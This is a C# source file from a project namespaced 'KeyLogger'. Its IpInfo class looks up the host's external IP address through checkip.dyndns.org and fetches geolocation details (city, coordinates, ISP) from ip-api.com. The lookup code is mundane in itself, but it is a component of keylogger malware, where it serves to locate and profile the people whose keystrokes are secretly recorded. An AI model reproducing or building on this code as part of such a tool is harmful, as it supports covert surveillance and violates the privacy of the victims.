namespace KeyLogger
{
    using System.Net;
    using System.Text.RegularExpressions;

    class IpInfo
    {
        public string GetIpAdress()
        {
            try
            {
                string externalIP;
                externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
                externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")).Matches(externalIP)[0].ToString();

                if (externalIP == string.Empty || externalIP == null)
                    return "NOIPFOUND";

                return externalIP;
            }
            catch
            {
                return "NOIPFOUND";
            }
        }

        public string GetIpInfo(string ip)
        {
            try
            {
                string ipInformationstring = string.Empty;
                byte[] ipInfo = (new WebClient()).DownloadData("http://ip-api.com/csv/" + ip.ToString());
                ipInformationstring = System.Text.Encoding.UTF8.GetString(ipInfo);
                if (ipInformationstring == string.Empty || ipInformationstring == null)
                    return "NOINFOFOUND";

                string[] allInfoSplit = ipInformationstring.Split(',');
                string[] infoSort = new string[]
                                        { "Status", "Country", "CountryCode", "Region",
                                            "RegionName", "City", "Zip", "Latitude", "Longitude", "Timezone", "ISP", "Org",
                                            "AS", "Reverse", "Mobile", "Proxy", "Query", "Status", "Message" };

                ipInformationstring = string.Empty;
                for (int i = 0; i < allInfoSplit.Length; i++)
                {
                    allInfoSplit[i] += "\n";
                    ipInformationstring += infoSort[i] + ": ";
                    ipInformationstring += allInfoSplit[i];
                }
                return ipInformationstring;
            }
            catch
            {
                return "NOINFOFOUND";
            }
        }
    }
}
